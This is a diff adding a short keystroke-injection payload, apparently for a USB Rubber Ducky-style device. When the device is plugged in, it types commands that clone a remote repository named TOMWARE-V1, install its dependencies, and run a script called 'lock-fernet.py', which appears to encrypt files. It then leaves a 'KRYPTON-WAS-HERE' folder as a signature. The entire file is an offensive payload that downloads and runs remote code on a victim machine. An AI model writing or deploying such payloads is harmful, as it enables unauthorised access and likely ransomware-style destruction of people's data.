@@ -1,0 +1,6 @@
+DELAY 1000
+STRING git clone https://github.com/tomxpo9/TOMWARE-V1.git
+ENTER
+DELAY 5000
+STRING cd TOMWARE-V1 && pip install -r requirements.txt && python lock-fernet.py && cd .. && mkdir KRYPTON-WAS-HERE && ls
+ENTER
